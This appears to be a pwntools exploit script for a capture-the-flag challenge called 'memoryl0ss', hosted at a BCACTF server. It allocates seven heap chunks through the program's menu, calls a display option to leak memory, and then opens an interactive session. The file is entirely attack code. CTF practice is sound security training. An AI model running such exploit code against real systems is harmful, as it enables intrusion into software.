#!/usr/bin/python3

from pwn import *

exe = ELF('memoryl0ss', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('challs.bcactf.com', 30002)
else:
        p = process(exe.path)

GDB()
def create():
    sl(b"1")
    sl(b"1")
    sl(b"96")
    
def show():
    sla(b"> ", b"3")
    sla(b")\n", b"1")
for i in range (0, 7):
	create()
show()
p.interactive()
